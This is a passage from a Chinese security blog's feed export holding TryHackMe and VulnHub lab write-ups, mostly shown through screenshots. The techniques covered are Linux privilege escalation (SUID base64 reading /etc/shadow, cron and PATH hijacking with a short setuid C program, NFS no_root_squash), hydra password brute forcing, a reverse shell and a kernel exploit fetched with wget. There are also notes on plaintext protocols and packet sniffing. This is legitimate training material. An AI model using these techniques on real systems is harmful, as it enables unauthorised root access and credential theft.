class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p>实例：</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408031819752.png" alt="image-20240803181904538"></p><p>然后去查看/etc/shadow的内容 发现没权限</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408031820380.png" alt="image-20240803182059331"></p><p>然后去查一下具有suid权限的文件</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408031826141.png" alt="image-20240803182603040"></p><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>  在GTFOBins中可以查到base64的suid的提权</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408031827935.png" alt="image-20240803182714855"></p><p>可以进行文件的读取。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408031833692.png" alt="image-20240803183354514"></p><p>然后利用john解一下user2的密码。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408031837008.png" alt="image-20240803183743929"></p><p>然后ssh登录user2用户，在home目录下找到flag3.txt 但是这个仍然不是root权限，还利用上面的base64 进行读取文件。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408031840428.png" alt="image-20240803184043342"></p><h2 id="权限提升：功能-Capabilities"><a href="#权限提升：功能-Capabilities" class="headerlink" title="权限提升：功能(Capabilities)"></a>权限提升：功能(Capabilities)</h2><p>Linux capabilities 将 <strong>root 权限划分为更小、更独立的单元</strong>，允许进程拥有一部分权限。这通过不必要地授予完整的 root 权限来最小化风险。</p><p>这个地方不进行详细的讲解了，就大概说明一下怎么使用，具体参考：<a href="https://book.hacktricks.xyz/v/cn/linux-hardening/privilege-escalation/linux-capabilities">https://book.hacktricks.xyz/v/cn/linux-hardening/privilege-escalation/linux-capabilities</a></p><p>利用getcap列出已启用的功能</p><p><code>getcap / -r 2&gt;/dev/null</code></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051030146.png" alt="image-20240805103001043"></p><p>然后在gtfobins中查看Capabilities</p><p>这个地方我们可以使用view</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051046936.png" alt="image-20240805104628853"></p><p>但这个版本好像不太行，就没成功。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051049198.png" alt="image-20240805104948137"></p><h2 id="权限提升：Cron-Jobs"><a href="#权限提升：Cron-Jobs" class="headerlink" title="权限提升：Cron Jobs"></a>权限提升：Cron Jobs</h2><p>计划任务提权原理简单说一下：如果计划任务中有一个是以root身份运行的，并且我们可以查看该文件的内容，那么我们可以更改这个计划任务要运行的脚本内容，改成我们想要它执行的shell,当它下次执行的时候，就会变成root权限。</p><p>计划任务一般存放在/etc/crontab 文件中</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051106453.png" alt="image-20240805110631374"></p><p>如果未定义脚本的完整路径（如对 backup.sh 脚本所做的那样），则 cron 将引用 /etc/crontab 文件中 PATH 变量下列出的路径。在这种情况下，我们应该能够在用户的主文件夹下创建一个名为“antivirus.sh”的脚本，并且它应该由 cron 作业运行。</p><p>可以查看到backup.sh文件的内容</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051114074.png" alt="image-20240805111419011"></p><p>修改文件的内容。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051115693.png" alt="image-20240805111531637"></p><p>记得对backup.sh加上可执行的权限。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051511038.png" alt="image-20240805151116953"></p><p>最后监听端口即可得到root权限。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051511128.png" alt="image-20240805151151072"></p><h2 id="权限提升：PATH-环境变量提权"><a href="#权限提升：PATH-环境变量提权" class="headerlink" title="权限提升：PATH 环境变量提权"></a>权限提升：PATH 环境变量提权</h2><p>linux中的PATH是一个环境变量，它告诉操作系统在哪里搜索可执行文件。</p><p> <img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051534615.png" alt="image-20240805153445551"></p><p>像我们平时执行的ls cat find 等命令就是在PATH环境变量中进行查找的。</p><p>原理就是修改$PATH变量，当系统在执行某些常用命令时，优先运行攻击者提供的恶意可执行文件，从而进行一个权限的提升。</p><p>下面是演示：</p><p>首先我们先写一个c语言文件 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>setuid(<span class="hljs-number">0</span>);<br>setgid(<span class="hljs-number">0</span>);<br>system(<span class="hljs-string">&quot;thm&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>将其编译为可执行文件，并设置suid位。 </p><p>然后我们寻找可写的文件夹，将其添加到PATH变量中(如果PATH变量没有的话)，然后再向可写的文件夹下创建一个thm文件，将/bin/bash写入其中，将其赋予777权限，最后运行那个具有suid位的二进制文件，即可提权成功。</p><p>寻找可写的文件夹：</p><p><code>find / -writable 2&gt;/dev/null | cut -d &quot;/&quot; -f 2,3 | grep -v proc | sort -u</code></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051607893.png" alt="image-20240805160749792"></p><p>我们将tmp加到PATH变量里面。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051609757.png" alt="image-20240805160910692"></p><p>然后向tmp下创建一个thm文件，并赋予777权限。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051609998.png" alt="image-20240805160958915"></p><p>最后运行具有suid位的二进制文件。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051610374.png" alt="image-20240805161032325"></p><h2 id="权限提升：NFS"><a href="#权限提升：NFS" class="headerlink" title="权限提升：NFS"></a>权限提升：NFS</h2><p>有的时候提权，不仅仅可以通过上面那些操作来进行，还可以通过共享文件夹和远程管理接口来进行提权(ssh,telnet等)。例如：在目标系统上找到root的ssh私钥,我们就可以通过ssh来连接目标服务器，从而达到root权限。</p><p>NFS（网络文件共享）配置保存在 /etc/exports 文件中。此文件是在 NFS 服务器安装期间创建的，通常可由用户读取。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051632567.png" alt="image-20240805163235468"></p><p>权限提升的关键元素是如上所示的“no_root_squash”选项。默认情况下，NFS 会将 root 用户更改为 nfsnobody，并剥夺任何文件以 root 权限运行的权利。如果可写共享上存在“no_root_squash”选项，我们可以创建一个设置了 SUID 位的可执行文件并在目标系统上运行它。</p><h3 id="1-枚举目标机器上的可挂载共享。"><a href="#1-枚举目标机器上的可挂载共享。" class="headerlink" title="1.枚举目标机器上的可挂载共享。"></a>1.枚举目标机器上的可挂载共享。</h3><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051637138.png" alt="image-20240805163709080"></p><h3 id="2-把其中一个“no-root-squash”共享安装到我们的攻击机器上并开始构建我们的可执行文件。"><a href="#2-把其中一个“no-root-squash”共享安装到我们的攻击机器上并开始构建我们的可执行文件。" class="headerlink" title="2.把其中一个“no_root_squash”共享安装到我们的攻击机器上并开始构建我们的可执行文件。"></a>2.把其中一个“no_root_squash”共享安装到我们的攻击机器上并开始构建我们的可执行文件。</h3><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051641457.png" alt="image-20240805164116393"></p><h3 id="3-构造具有suid位的可执行文件"><a href="#3-构造具有suid位的可执行文件" class="headerlink" title="3.构造具有suid位的可执行文件"></a>3.构造具有suid位的可执行文件</h3><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051644339.png" alt="image-20240805164434274"></p><p>然后在目标系统上执行具有suid位的二进制文件。</p>]]></content>
    
    
    <categories>
      
      <category>Jr Penetration Tester</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>w1r3s</title>
    <link href="/2024/07/18/w1r3s/"/>
    <url>/2024/07/18/w1r3s/</url>
    
    <content type="html"><![CDATA[<h1 id="w1r3s"><a href="#w1r3s" class="headerlink" title="w1r3s"></a>w1r3s</h1><h2 id="信息收集加提权"><a href="#信息收集加提权" class="headerlink" title="信息收集加提权"></a>信息收集加提权</h2><p>在同一子网中，利用arp-scan -l 进行存活主机的探测。</p><p>然后利用nmap进行端口的扫描。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407180951487.png" alt="image-20240718095053343"></p><p>这个靶机是一个unubtu的，然后用户名我们是知道的，去利用hydra爆破ftp和ssh的密码，最终可以得到ssh的密码。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407181008796.png" alt="image-20240718100851694"></p><p>其实到这一步距离提权就很快了，ssh的密码也是那台机器的密码。然后就去看一下如何提权。</p><p>先<code>sudo -l</code>看一下内容</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407181058858.png" alt="image-20240718105825780"></p><p>是ALL的话，我们可以直接利用<code>sudo su</code>进行提权。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407181059342.png" alt="image-20240718105913287"></p>]]></content>
    
    
    <categories>
      
      <category>靶机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Net Sec Challenge</title>
    <link href="/2024/07/17/Net%20Sec%20Challenge/"/>
    <url>/2024/07/17/Net%20Sec%20Challenge/</url>
    
    <content type="html"><![CDATA[<h1 id="Net-Sec-Challenge"><a href="#Net-Sec-Challenge" class="headerlink" title="Net Sec Challenge"></a>Net Sec Challenge</h1><p>使用nmap对1-10000的端口进行一个扫描</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">nmap</span> -sV -<span class="hljs-built_in">p1</span>-<span class="hljs-number">10000</span> -T4 <span class="hljs-built_in">ip</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407171536534.png" alt="image-20240717153652326"></p><p>可以看到ssh服务器标头隐藏的信息，以及在10000以内开放的端口的详细信息。</p><p>使用telnet对http进行一个远程连接</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407171538759.png" alt="image-20240717153818631"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-armasm"><span class="hljs-symbol">host:</span><span class="hljs-built_in">ip</span></span><br></code></pre></td></tr></table></figure><p>可以看到HTTP服务器标头中隐藏的信息。</p><p>通过扫描10000-15000的端口，可以看到一个端口为10021的ftp服务。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407171605168.png" alt="image-20240717160514047"> </p><p>然后知道有两个用户名 eddie和quinn</p><p>通过hydra进行一个爆破</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407171625724.png" alt="image-20240717162515580"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407171625875.png" alt="image-20240717162530822"></p><p>可以得到账户密码。</p><p>然后去ftp登录一下，在quinn用户下发现flag</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407171642901.png" alt="image-20240717164243817"></p><p>绕过IDS时，使用nmap -sN ip进行扫描</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407171726464.png" alt="image-20240717172656357"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407171727746.png" alt="image-20240717172707595"></p>]]></content>
    
    
    <categories>
      
      <category>Jr Penetration Tester</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GoldenEye</title>
    <link href="/2024/07/16/GoldenEye/"/>
    <url>/2024/07/16/GoldenEye/</url>
    
    <content type="html"><![CDATA[<h1 id="GoldenEye"><a href="#GoldenEye" class="headerlink" title="GoldenEye"></a>GoldenEye</h1><h2 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h2><p>1.由于靶机和kali在同一网段中，可以使用arp-scan进行存活主机的扫描。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161523604.png" alt="image-20240716152330426"></p><p>可以查询到目标ip的地址。</p><p>去访问一下：</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161524135.png" alt="image-20240716152441074"></p><p>有一个登录的路由，但不知道账号密码，可以对端口和目录先进行一个信息的收集。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161531316.png" alt="image-20240716153117183"></p><p>可以看到开启了四个端口，其中一个http服务，和smtp(邮件传输协议) pop3(邮局协议)，都是以明文的形式进行传输，可能会跟账户密码有关联。 </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161535894.png" alt="image-20240716153529798"></p><p>扫目录就扫到了一个js文件，访问去看一下。查看网页源代码也能进行看到。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161540058.png" alt="image-20240716154014964"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161606962.png" alt="image-20240716160651853"></p><p>可以得到两个用户名和一个密码 Boris Natalya 密码经过html解码之后是：InvincibleHack3r</p><p>然后用telnet进行pop3的登录 但无果，登录后台也不行，那就是密码不对了，对密码进行爆破。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161655463.png" alt="image-20240716165515399"></p><p>Boris的密码是secret1! </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161700951.png" alt="image-20240716170003801"></p><p>Natalya的密码是bird</p><p>然后爆破出来密码之后进行一个pop3的telnet连接。</p><p>在Boris的电子邮箱中发现三个电子邮件，在NataLya的电子邮箱中发现2个电子邮件。</p><p>在电子邮件中可以得知账户密码。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161706817.png" alt="image-20240716170601693"></p><p>注意下面的信息，添加severnaya-station.com到host文件中，linux的就在/etc/hosts中添加一下对应的ip和网址即可。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161716184.png" alt="image-20240716171656092"></p><p>然后去访问<a href="http://severnaya-station.com/gnocertdir">http://severnaya-station.com/gnocertdir</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161717951.png" alt="image-20240716171732761"></p><p>可以进行一个登录，用户名和密码试试之前邮箱得到的。登录成功。</p><p>进入后台之后仍然对信息进行一个收集，看看是什么版本的，有没有敏感信息的泄露。</p><p>可以找到一个邮件，用户名是Doak</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161738349.png" alt="image-20240716173802270"></p><p>对密码进行一下爆破。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161742544.png" alt="image-20240716174246433"></p><p>得到了密码，利用telnet进行登录。</p><p>得到账户密码<img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161745639.png" alt="image-20240716174501588"></p><p>然后退出xenia的账号，用doak的账户进行一个登录。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161749855.png" alt="image-20240716174948782"></p><p>在这个地方有一个文件，下载下来，里面是一些信息。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161751104.png" alt="image-20240716175136985"></p><p>让我们去访问一张图片，路径给了，把它下载下来。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161753194.png" alt="image-20240716175341119"></p><p>在图片描述里面发现一个经过base64编码的信息，解码看看。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161754214.png" alt="image-20240716175430127"></p><p>应该是某个用户的密码。</p><p>先把doak用户给退出，然后admin登录试试看，结果是可以的。</p><h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><p>一种方法，可以利用msf搜索相关的漏洞利用，然后设置一些信息，最后run即可。</p><p>另一种方法，就是利用python反弹一个shell。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161932694.png" alt="image-20240716193201473"></p><p>在上面那个地方进行一个反弹shell.  反弹shell命令： <a href="https://www.revshells.com/">https://www.revshells.com/</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161932978.png" alt="image-20240716193227924"></p><p>最后去点这里</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161934624.png" alt="image-20240716193434530"></p><p>让反弹shell的命令执行成功。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>根据前面打靶机的经验，既然是unubtu的系统，那就看看是否存在内核提权漏洞。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161948413.png" alt="image-20240716194806343"></p><p>去搜索一下</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407161952971.png" alt="image-20240716195256797"></p><p>存在这个内核漏洞，那就利用一下。</p><p>在本地开一个http服务器， <code>python3 -m http.server 8080</code> </p><p>把文件放到你开启服务的目录下面去，然后在靶机上面利用wget进行下载。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407162014416.png" alt="image-20240716201443300"></p><p>但gcc这个环境并没有 可以把gcc改成cc</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407162024891.png" alt="image-20240716202448748"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407162027528.png" alt="image-20240716202739328"></p>]]></content>
    
    
    <categories>
      
      <category>靶机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>协议和服务器</title>
    <link href="/2024/07/13/%E5%8D%8F%E8%AE%AE%E5%92%8C%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <url>/2024/07/13/%E5%8D%8F%E8%AE%AE%E5%92%8C%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="协议和服务器"><a href="#协议和服务器" class="headerlink" title="协议和服务器"></a>协议和服务器</h1><p>主要介绍了一些常用的协议。</p><h2 id="HTTP-超文本传输协议"><a href="#HTTP-超文本传输协议" class="headerlink" title="HTTP(超文本传输协议)"></a>HTTP(超文本传输协议)</h2><p>是用于传输网络的协议，网络浏览器连接到网络服务器并使用HTTP请求 HTML 页面和图像以及其他文件，提交表单并上传各种文件。</p><p>下面是thm的一个图像解释：<br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/a23a13cef49ae7fff87bfd94f6a175dc.png" alt="img"></p><p>http以明文的形式发送数据，因此我们可以使用telnet来充当web浏览器，向web服务器发送数据。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407131011443.png" alt="image-20240713101118210"></p><h2 id="FTP-文件传输协议"><a href="#FTP-文件传输协议" class="headerlink" title="FTP(文件传输协议)"></a>FTP(文件传输协议)</h2><p>ftp主要用于不同系统不同计算机之间进行文件的传输。ftp默认监听<strong>21端口</strong>，使用明文进行数据的传输，我们同样可以使用telnet来代替ftp客户端 和ftp服务端进行一个数据的通信。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407131028189.png" alt="image-20240713102854955"></p><p>SYST是查看目标的系统类型。</p><p>FTP的PASV有两种模式：</p><ul><li>主动：在主动模式下，数据通过源自FTP服务器端口 20 的单独通道发送。</li><li>被动：在被动模式下，数据通过来自FTP客户端端口号 1023 以上的单独通道发送。</li></ul><p>TYPE A是将文件传输模式转成ASCII。TYPE I是将文件传输模式转成二进制。</p><p>我们不能使用简单的客户端（例如telnet）来传输文件，因为ftp会为文件传输创建单独的连接。</p><p>FTP服务器软件的示例包括：</p><ul><li><a href="https://security.appspot.com/vsftpd.html">vsftpd</a></li><li><a href="http://www.proftpd.org/">FTPD软件</a></li><li><a href="https://www.uftpserver.com/">FTP服务器</a></li></ul><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407131049171.png" alt="image-20240713104903106"></p><p>get filename下载文件</p><h2 id="POP3-邮局协议3"><a href="#POP3-邮局协议3" class="headerlink" title="POP3(邮局协议3)"></a>POP3(邮局协议3)</h2><p>邮局协议版本 3 (POP3) 是一种用于从邮件投递代理 ( MDA ) 服务器下载电子邮件消息的协议，如下图所示。邮件客户端连接到POP3服务器，进行身份验证，下载新电子邮件消息，然后（可选）删除它们。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/ed910ad418376edc846846fc2a0dd3f6.png" alt="img"></p><p>默认监听端口是<strong>110</strong></p><p>pop3需要进行身份的验证。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407131133906.png" alt="image-20240713113341847"></p><p>使用STAT我们得到响应 <code>+OK nn mm</code> nn代表收件箱中的电子邮件数量 mm代表收件箱的大小（以八字节为单位）。</p><p><code>LIST</code>提供了服务器上的新消息列表，并<code>RETR 1</code>检索列表中的第一条消息。</p><h2 id="SMTP-简单邮件传输协议"><a href="#SMTP-简单邮件传输协议" class="headerlink" title="SMTP(简单邮件传输协议)"></a>SMTP(简单邮件传输协议)</h2><p>通过互联网传递电子邮件需要以下组件：</p><ol><li>邮件提交代理 (MSA)</li><li>邮件传输代理（MTA）</li><li>邮件投递代理 ( MDA )</li><li>邮件用户代理 ( MUA )</li></ol><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/822a449fd569c16c875a13ca2487b714.png" alt="img"></p><p>流程用thm通俗的话语来解释一下：</p><ol><li>您（MUA）想要发送邮件。</li><li>在您当地的邮局 ( MTA ) 接受邮件之前，邮局员工 (MSA) 会检查邮件是否存在任何问题。</li><li>当地邮局检查邮件目的地并将其发送到正确国家的邮局（MTA ）。</li><li>邮局（MTA）将邮件投递到收件人邮箱（MDA）。</li><li>收件人（MUA）会定期检查邮箱是否有新邮件。他们会注意到新邮件，并接收它。</li></ol><p>简单传输协议SMTP用于和MTA服务器进行一个通信，SMTP使用的是明文，可以使用telnet客户端连接到SMTP服务器端，并充当发送消息的电子邮件客户端(MUA)。</p><p>SMTP监听25端口。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407131123511.png" alt="image-20240713112351327"></p><h2 id="IMAP-互联网消息访问协议"><a href="#IMAP-互联网消息访问协议" class="headerlink" title="IMAP(互联网消息访问协议)"></a>IMAP(互联网消息访问协议)</h2><p>使用的默认监听端口是<strong>143</strong></p><p>imap比pop3更复杂一些，它可以让电子邮件在多个设备（和邮件客户端）之间保持同步。简单来讲就是，你在手机上已经读过了这个邮件，那么在电脑上这个邮件将不会显示未读。</p><p>imap同样需要进行身份的一个验证。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407131146786.png" alt="image-20240713114643588"></p><p>imap要求每个命令前面都要有一个随机字符，所以fsrm fsrm1 fsrm3 是我们自己设置的。<code>list &quot;&quot; &quot;*&quot;</code>是列出邮件文件夹。 <code>EXAMINE INBOX</code>是查看邮件箱中是否有新的邮件。</p><table><thead><tr><th>Protocol</th><th>TCP Port</th><th>Application(s)</th><th>Data Security</th></tr></thead><tbody><tr><td>FTP</td><td>21</td><td>File Transfer</td><td>明文（明文）</td></tr><tr><td>HTTP</td><td>80</td><td>Worldwide Web</td><td>明文</td></tr><tr><td>IMAP</td><td>143</td><td>Email (MDA)</td><td>明文</td></tr><tr><td>POP3</td><td>110</td><td>Email (MDA)</td><td>明文</td></tr><tr><td>SMTP</td><td>25</td><td>Email (MTA)</td><td>明文</td></tr><tr><td>Telnet</td><td>23</td><td>Remote Access</td><td>明文</td></tr></tbody></table><h1 id="易遭受的攻击"><a href="#易遭受的攻击" class="headerlink" title="易遭受的攻击"></a>易遭受的攻击</h1><h2 id="1-嗅探攻击-网络数据包捕获"><a href="#1-嗅探攻击-网络数据包捕获" class="headerlink" title="1.嗅探攻击(网络数据包捕获)"></a>1.嗅探攻击(网络数据包捕获)</h2><p>当协议以明文的方式进行传输时，第三方可以对传输的数据进行一个分析，从而可以获取到一些敏感的信息。</p><p>只要用户具有适当的权限（ Linux上的 root 权限和 MS Windows 上的管理员权限），就可以使用以太网 (802.3) 网卡进行嗅探攻击。有许多程序可用于捕获网络数据包。</p><p>1.Wireshark是一个免费的开源图形用户界面 (GUI) 程序，适用于多种操作系统，包括Linux、macOS 和 MS Windows。</p><p>2.Tcpdump是一个免费的开源命令行界面 ( CLI ) 程序，已被移植到许多操作系统上运行。</p><p>3.Tshark是Wireshark 的CLI替代品。</p><p>使用Tcpdump对数据进行获取：</p><p>命令如下：<code>sudo Tcpdump port xxx -A</code> </p><p>这里举一个例子，A用户使用pop3进行邮件的检查，此时的pop3监听端口是110，那么</p><p><code>sudo Tcpdump port 110 -A</code>  </p><p>-A是以ascii码的形式显示捕获的数据包。</p><p>或者使用Wireshark进行流量分析。如下图所示：<br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c1ec79277c1f02beeb20f7dc81df2fd3.png" alt="img"></p><p>防御方法就是对传输的数据进行一个加密，不用明文进行传输。对于远程访问，telnet用ssh进行代替。</p><h2 id="2-中间人攻击-MITM"><a href="#2-中间人攻击-MITM" class="headerlink" title="2.中间人攻击(MITM)"></a>2.中间人攻击(MITM)</h2><p>假设有A,B两个用户 中间人是C</p><p>A用户向B用户发送信息，但这个信息被C给劫持了，C再告诉B修改后的信息，B做出反应。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/3cb0c4f9dde184bf8dcd6b3a45418a44.png" alt="img"></p><p>防御措施：</p><p>1.使用适当的身份验证。</p><p>2.对传输的信息进行一个加密或者签名。</p><p>传输层安全性(TLS) 可防止这个攻击。</p><p>许多工具可以帮助你实施此类攻击，例如<a href="https://www.ettercap-project.org/">Ettercap</a>和<a href="https://www.bettercap.org/">Bettercap</a></p><h2 id="3-密码攻击-身份验证攻击"><a href="#3-密码攻击-身份验证攻击" class="headerlink" title="3.密码攻击(身份验证攻击)"></a>3.密码攻击(身份验证攻击)</h2><p>关于密码攻击大致有三类：</p><p>1.进行猜测，有些人会将密码设置成宠物的名字或者出生日期等。</p><p>2.字典攻击，拓展了密码猜测，将所有可能的结果放在一个字典中。</p><p>3.暴力破解：这种攻击是最彻底、最耗时的攻击，攻击者会尝试所有可能的字符组合，并且这种攻击会快速增长。</p><p><code>hydra</code>是一个不错的暴力破解工具，支持多种协议（pop3,http,ssh,ftp,smtp,imap等）</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs armasm">使用命令：<br><span class="hljs-symbol">hydra</span> -l username -P xxx.txt <span class="hljs-built_in">ip</span> service <span class="hljs-comment">//xxx.txt为密码字典  service为不同的服务</span><br>有些情况下，扫描出来的服务并不是默认端口，例如pop3服务扫描出来的端口信息是<span class="hljs-number">55007</span> hydra -l username -P xxx.txt -s PORT <span class="hljs-built_in">ip</span> service<br>-V 显示详细信息<br>-d 进行调试<br>-t n 设置线程 如果不设置的话默认是<span class="hljs-number">16</span> <br></code></pre></td></tr></table></figure><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><h2 id="传输层安全性-TLS"><a href="#传输层安全性-TLS" class="headerlink" title="传输层安全性 (TLS)"></a>传输层安全性 (TLS)</h2><p>可以防止密码嗅探和中间人攻击。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/9d265987c58331f6fd2f664837f85380.png" alt="img"></p><h1 id="概括"><a href="#概括" class="headerlink" 